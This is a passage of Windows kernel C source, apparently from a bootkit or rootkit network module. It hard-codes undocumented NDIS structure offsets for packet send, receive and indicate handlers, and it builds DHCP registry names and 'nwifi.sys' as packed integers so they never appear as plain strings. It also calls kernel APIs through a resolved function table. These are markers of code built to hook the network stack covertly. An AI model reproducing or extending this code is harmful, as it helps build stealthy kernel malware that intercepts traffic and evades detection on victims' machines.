            pNetworkBlock->dwNdisMiniportDpc                = 0x010;    // NDIS_INTERRUPT_BLOCK.MiniportDpc
            pNetworkBlock->dwNdisPhysicalMediumType         = 0x444;    // NDIS_MINIPORT_BLOCK.PhysicalMediumType
            pNetworkBlock->dwNdisEthRxIndicateHandler       = 0x164;    // NDIS_MINIPORT_BLOCK.EthRxIndicateHandler
            pNetworkBlock->dwNdisPacketIndicateHandler      = 0x0E8;    // NDIS_MINIPORT_BLOCK.PacketIndicateHandler
            pNetworkBlock->dwNdisMSendPacketsHandles        = 0x078;    // NDIS_MINIPORT_BLOCK.NDIS_M_DRIVER_BLOCK.NDIS_MINIPORT_CHARACTERISTICS.SendPacketsHandler
            pNetworkBlock->dwNdisMReturnPacket              = 0x074;    // NDIS_MINIPORT_BLOCK.NDIS_M_DRIVER_BLOCK.NDIS_MINIPORT_CHARACTERISTICS.ReturnPacketHandler
            pNetworkBlock->dwNdisSendPacketsHandler         = 0x15C;    // NDIS_MINIPORT_BLOCK.SendPacketsHandler
            pNetworkBlock->dwNdisMPSendCompleteHandler      = 0x0EC;    // NDIS_MINIPORT_BLOCK.SendCompleteHandler
            pNetworkBlock->dwNdisSendCompleteHandler        = 0x038;    // NDIS_OPEN_BLOCK.SendCompleteHandler
            pNetworkBlock->dwNdisHaltHandler                = 0x04C;    // NDIS_M_DRIVER_BLOCK.MiniportCharacteristics.HaltHandler
            pNetworkBlock->dwNdisPauseHandler               = 0x054;    // NDIS_M_DRIVER_BLOCK.MiniportDriverCharacteristics.PauseHandler
            pNetworkBlock->dwNdisRestartHandler             = 0x058;    // NDIS_M_DRIVER_BLOCK.MiniportDriverCharacteristics.RestartHandler
            pNetworkBlock->dwNdisSndNetBufLstsCmptHandler   = 0xAB4;    // NDIS_MINIPORT_BLOCK.SendNetBufferListsCompleteHandler
            pNetworkBlock->dwNdisMiniportName               = 0xe50;    // NDIS_MINIPORT_BLOCK.MiniportName
            pNetworkBlock->dwNdisMDriverBlock               = 0xe04;    // NDIS_MINIPORT_BLOCK.DriverHandle
            pNetworkBlock->dwNdisSendNetBufferLists         = 0x060;    // NDIS_M_DRIVER_BLOCK.MiniportCharacteristics.SendNetBufferListsHandler
            pNetworkBlock->dwNdisReturnNetBufferLists       = 0x064;    // NDIS_M_DRIVER_BLOCK.MiniportCharacteristics.ReturnNetBufferListsHandler
            pNetworkBlock->dwNdisMpAdapterContext           = 0x00c;    // NDIS_MINIPORT_BLOCK.MiniportAdapterContext
            pNetworkBlock->dwNdisIndicateNBLHandler         = 0x19C;    // NDIS_MINIPORT_BLOCK.IndicateNetBufferListsHandler

            pNetworkBlock->dwNdisLowestFilter                       = 0x980; // NDIS_MINIPORT_BLOCK.LowestFilter
            pNetworkBlock->dwNdisFilterDriver                       = 0x008; // NDIS_FILTER_BLOCK.FilterDriver
            pNetworkBlock->dwNdisDriverObject                       = 0x008; // NDIS_FILTER_DRIVER_BLOCK.ImageName
            pNetworkBlock->dwNdisWiFiSendNetBufferListsHandler      = 0x068; // NDIS_FILTER_DRIVER_BLOCK._NDIS_FILTER_DRIVER_CHARACTERISTICS.SendNetBufferListsHandler
            pNetworkBlock->dwNdisWiFiReturnNetBufferListsHandler    = 0x078; // NDIS_FILTER_DRIVER_BLOCK._NDIS_FILTER_DRIVER_CHARACTERISTICS.ReturnNetBufferListsHandler
            pNetworkBlock->dwNdisFilterModuleContext                = 0x00C; // NDIS_FILTER_BLOCK.FilterModuleContext
            pNetworkBlock->dwNdisWiFiDriverObject                   = 0x008; // NDIS_FILTER_DRIVER_BLOCK.DriverObject
            pNetworkBlock->dwNdisHigherFilter                       = 0x038; // NDIS_FILTER_BLOCK.HigherFilter
#endif
        }
    }
    
    // Инициализация даннных...
    {
        uint8_t* ptr;
        uint8_t* ptr1;

        ptr = pCommonBlock->fnExAllocatePoolWithTag(NonPagedPool, 2*sizeof(UNICODE_STRING) + 28/*sizeof("DhcpIPAddress")*/, LOADER_TAG);
        ptr1 = ptr + 2 * sizeof(UNICODE_STRING);
        *(((uint32_t*)ptr1)++) = 0x00680044;    // \0D\0h
        *(((uint32_t*)ptr1)++) = 0x00700063;    // \0c\0p
        *(((uint32_t*)ptr1)++) = 0x00500049;    // \0I\0P
        *(((uint32_t*)ptr1)++) = 0x00640041;    // \0A\0d
        *(((uint32_t*)ptr1)++) = 0x00720064;    // \0d\0r
        *(((uint32_t*)ptr1)++) = 0x00730065;    // \0e\0s
        *((uint32_t*)ptr1) = 0x00000073;        // \0s\0\0
        pCommonBlock->fnRtlInitUnicodeString((PUNICODE_STRING)ptr, (PCWSTR)(ptr + 2 * sizeof(UNICODE_STRING) + 8));
        pNetworkBlock->netParams[0] = (PUNICODE_STRING)ptr;
        pCommonBlock->fnRtlInitUnicodeString(((PUNICODE_STRING)ptr) + 1, (PCWSTR)(ptr + 2 * sizeof(UNICODE_STRING)));
        pNetworkBlock->altNetParams[0] = ((PUNICODE_STRING)ptr) + 1;

        ptr = pCommonBlock->fnExAllocatePoolWithTag(NonPagedPool, 2*sizeof(UNICODE_STRING) + 38/*sizeof("DhcpDefaultGateway")*/, LOADER_TAG);
        ptr1 = ptr + 2*sizeof(UNICODE_STRING);
        *(((uint32_t*)ptr1)++) = 0x00680044;    // \0D\0h
        *(((uint32_t*)ptr1)++) = 0x00700063;    // \0c\0p
        *(((uint32_t*)ptr1)++) = 0x00650044;    // \0D\0e
        *(((uint32_t*)ptr1)++) = 0x00610066;    // \0f\0a
        *(((uint32_t*)ptr1)++) = 0x006C0075;    // \0u\0l
        *(((uint32_t*)ptr1)++) = 0x00470074;    // \0t\0G
        *(((uint32_t*)ptr1)++) = 0x00740061;    // \0a\0t
        *(((uint32_t*)ptr1)++) = 0x00770065;    // \0e\0w
        *(((uint32_t*)ptr1)++) = 0x00790061;    // \0a\0y
        *((uint16_t*)ptr1) = 0x0000;            // \0\0
        pCommonBlock->fnRtlInitUnicodeString((PUNICODE_STRING)ptr, (PCWSTR)(ptr + 2 * sizeof(UNICODE_STRING) + 8));
        pNetworkBlock->netParams[1] = (PUNICODE_STRING)ptr;
        pCommonBlock->fnRtlInitUnicodeString(((PUNICODE_STRING)ptr) + 1, (PCWSTR)(ptr + 2 * sizeof(UNICODE_STRING)));
        pNetworkBlock->altNetParams[1] = ((PUNICODE_STRING)ptr) + 1;
        
        ptr = pCommonBlock->fnExAllocatePoolWithTag(NonPagedPool, 2*sizeof(UNICODE_STRING) + 30/*sizeof("DhcpSubnetMask")*/, LOADER_TAG);
        ptr1 = ptr + 2*sizeof(UNICODE_STRING);
        *(((uint32_t*)ptr1)++) = 0x00680044;    // \0D\0h
        *(((uint32_t*)ptr1)++) = 0x00700063;    // \0c\0p
        *(((uint32_t*)ptr1)++) = 0x00750053;    // \0S\0u
        *(((uint32_t*)ptr1)++) = 0x006E0062;    // \0b\0n
        *(((uint32_t*)ptr1)++) = 0x00740065;    // \0e\0t
        *(((uint32_t*)ptr1)++) = 0x0061004D;    // \0M\0a
        *(((uint32_t*)ptr1)++) = 0x006B0073;    // \0s\0k
        *((uint16_t*)ptr1) = 0x0000;            // \0\0
        pCommonBlock->fnRtlInitUnicodeString((PUNICODE_STRING)ptr, (PCWSTR)(ptr + 2 * sizeof(UNICODE_STRING) + 8));
        pNetworkBlock->netParams[2] = (PUNICODE_STRING)ptr;
        pCommonBlock->fnRtlInitUnicodeString(((PUNICODE_STRING)ptr) + 1, (PCWSTR)(ptr + 2 * sizeof(UNICODE_STRING)));
        pNetworkBlock->altNetParams[2] = ((PUNICODE_STRING)ptr) + 1;

        ptr = pCommonBlock->fnExAllocatePoolWithTag(NonPagedPool, 2*sizeof(UNICODE_STRING) + 30/*sizeof("DhcpNameServer")*/, LOADER_TAG);
        ptr1 = ptr + 2*sizeof(UNICODE_STRING);
        *(((uint32_t*)ptr1)++) = 0x00680044;    // \0D\0h
        *(((uint32_t*)ptr1)++) = 0x00700063;    // \0c\0p
        *(((uint32_t*)ptr1)++) = 0x0061004E;    // \0N\0a
        *(((uint32_t*)ptr1)++) = 0x0065006D;    // \0m\0e
        *(((uint32_t*)ptr1)++) = 0x00650053;    // \0S\0e
        *(((uint32_t*)ptr1)++) = 0x00760072;    // \0r\0v
        *(((uint32_t*)ptr1)++) = 0x00720065;    // \0e\0r
        *((uint16_t*)ptr1) = 0x0000;            // \0\0
        pCommonBlock->fnRtlInitUnicodeString((PUNICODE_STRING)ptr, (PCWSTR)(ptr + 2 * sizeof(UNICODE_STRING) + 8));
        pNetworkBlock->netParams[3] = (PUNICODE_STRING)ptr;
        pCommonBlock->fnRtlInitUnicodeString(((PUNICODE_STRING)ptr) + 1, (PCWSTR)(ptr + 2 * sizeof(UNICODE_STRING)));
        pNetworkBlock->altNetParams[3] = ((PUNICODE_STRING)ptr) + 1;

        ptr = (UINT8*)pNetworkBlock->nwifi; // nwifi.sys
        *(((PUINT32)ptr)++) = 0x0077006e;
        *(((PUINT32)ptr)++) = 0x00660069;
        *(((PUINT32)ptr)++) = 0x002e0069;
        *(((PUINT32)ptr)++) = 0x00790073;
        *(PUINT16)ptr = 0x00000073;


        pCommonBlock->fncommon_allocate_memory(pCommonBlock, &pNetworkBlock->pInPacketBuffer, 1600, NonPagedPool);
        pNetworkBlock->needReconfigure = TRUE;
    }

    return STATUS_SUCCESS;
}
